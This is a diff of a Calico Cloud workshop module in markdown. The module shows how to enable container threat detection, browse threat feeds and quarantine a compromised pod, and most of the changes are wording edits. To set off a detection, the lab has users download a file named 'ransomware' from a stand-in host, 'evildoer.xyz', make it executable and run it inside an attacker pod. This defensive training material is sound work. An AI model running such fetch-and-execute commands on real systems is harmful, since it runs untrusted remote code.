@@ -14,17 +14,13 @@ Our threat detection engine also monitors activity within the containers running
 1. Let's start by enabling the container threat detection feature.
    For this, go to the `Threat Defense` option in the left-hand menu of Calico Cloud and select `Container Threat Detection`.
 
-2. If it is not enabled, you will see a page like this:
+2. Navigate to `Threat Defense > Container Threat Detection` and click on the `Enable Container Threat Detection` button.
 
-   ![enable](https://github.com/tigera-solutions/cc-aks-detect-block-network-attacks/assets/104035488/54014c62-cbef-4718-93fa-75390febb88a)
+   ![enable-threat-detection](https://github.com/tigera-solutions/cc-eks-visualize-identify-security-gaps/assets/104035488/89d290a7-2aef-4a6b-8813-11bf94db2577)
 
-   Click on the Enable Container Threat Detection button, and you will see the following page:
+   Perfect! Now, any suspicious activities will generate an alert. Let's try some.
 
-   ![running](https://github.com/tigera-solutions/cc-aks-detect-block-network-attacks/assets/104035488/42906ad6-ced1-40a8-b817-4a4b5c740d08)
-
-   Perfect! Now any suspicious activities will generate an alert. Let's try some.
-
-   In other to see the results faster, execute the following on the cluster:
+   To see the results faster, execute the following on the cluster:
 
    ```bash
    kubectl -n tigera-runtime-security annotate daemonset runtime-reporter unsupported.operator.tigera.io/ignore="true"
@@ -40,15 +36,15 @@ Security events suggest the possible presence of a threat actor in your Kubernet
 - Understand the scope and frequency of the issue
 - Manage alert noise by dismissing events (show/hide)
 
-To test this feature, let's download a file that contains the hash of a malware and execute it inside the pod attacker.
+To test this feature, we can download a file containing the hash of malware and execute it inside the pod attacker.
 
-1. Execute the bash inside the pod attack in way you can interact with its shell prompt:
+1. Execute the bash inside the pod attack in the way you can interact with its shell prompt:
 
    ```bash
    kubectl exec attacker -it -- /bin/bash
    ```
 
-2. From the bash inside the pod attacker execute the following command to: 1) Download the malware, change its permission and run it.
+2. From the bash inside the pod `attacker`, execute the following command to download the malware, change its permission and run it.
 
    ```bash
    wget http://evildoer.xyz/ransomware
@@ -60,7 +56,7 @@ To test this feature, let's download a file that contains the hash of a malware 
 
    ![security-events](https://github.com/tigera-solutions/cc-aks-visualize-identify-security-gaps/assets/104035488/200b4d0b-490a-4d7c-b18e-ef9c59cc6079)
 
-   Because the `ransomware` file has a hash that identifies it as a malware, Calico will create a **Malware** event indicating its execution event. Additionally, a security event showing the modification of the file permission (`chmod +x ransomware`) will be created as well.
+   Because the `ransomware` file has a hash that identifies it as malware, Calico will create a **Malware** event indicating its execution event. Additionally, a security event showing the modification of the file permission (`chmod +x ransomware`) will be created as well.
 
    Optionally, you can also try the following commands and observe the security events that are created;
    
@@ -74,9 +70,9 @@ To test this feature, let's download a file that contains the hash of a malware 
 
 ## Threat Feeds
 
-In modern cloud-native security, threat intelligence feeds are vital for monitoring and tracking the IP addresses and domains associated with known malicious actors. Calico Cloud integrates threat intelligence feeds, including AlienVault, into its default security policies. This means that right from the outset, any traffic directed to suspicious IP addresses or domain is automatically blocked without requiring additional setup.
+In modern cloud-native security, threat intelligence feeds are vital for monitoring and tracking the IP addresses and domains associated with known malicious actors. Calico Cloud integrates threat intelligence feeds, including AlienVault, into its default security policies. This means that right from the outset, any traffic directed to suspicious IP addresses or domains is automatically blocked without requiring additional setup.
 
-1. Explore the Threat Feeds available in Calico Cloud UI in the `Threat Defense` > `Threat Feeds`. Click on each one of them to visualize the lists of IP addresses or domains.
+1. Explore the Threat Feeds available in Calico Cloud UI in the `Threat Defense` > `Threat Feeds`. Click on each one to visualize the lists of IP addresses or domains.
 
    ![threat-feeds](https://github.com/tigera-solutions/cc-aks-visualize-identify-security-gaps/assets/104035488/719cb334-e981-4e5e-8ef4-b37eea4a422b)
 
@@ -92,11 +88,11 @@ In modern cloud-native security, threat intelligence feeds are vital for monitor
 
 ## Quarantine a workload
 
-Suppose you have a compromised workload in your environment and want to conduct further investigation on it. In that case, you should not terminate the workload but isolate it, so it will not be able to cause damage or spread laterally across your environment. In this situation, you should quarantine the pod by applying a security policy to it that will deny all the egress and ingress traffic and log all the communications attempts from and to that pod.
+Suppose you have a compromised workload in your environment and want to conduct further investigation on it. In that case, you should not terminate the workload but isolate it so it will not be able to cause damage or spread laterally across your environment. In this situation, you should quarantine the pod by applying a security policy that will deny all the egress and ingress traffic and log all the communications attempts from and to that pod.
 
 We have the `quarantine` policy created in the `security` tier. This policy has a label selector of `quarantine = true`. Let's see how it works.
 
-1. Execute the following commands from the attacker pod (if you did quit from its shell, it got deleted. Create it again if it's the case.).
+1. Execute the following commands from the attacker pod (if you did quit from its shell, it got deleted. Create it again if that's the case.).
 
    - Test the connection to a local service
 
@@ -122,7 +118,7 @@ We have the `quarantine` policy created in the `security` tier. This policy has 
    kubectl label pod attacker quarantine=true
    ```
 
-3. Repeat the tests from step 1. Now, as you can see, the cannot establish communication with any of the destinations.
+3. Repeat the tests from step 1. Now, as you can see, they cannot establish communication with any of the destinations.
 
 --- 
 [:arrow_right: Module 4 - Enforcing security policy to stop C&C attacks](/mod/module-4-security-policies.md)   <br>
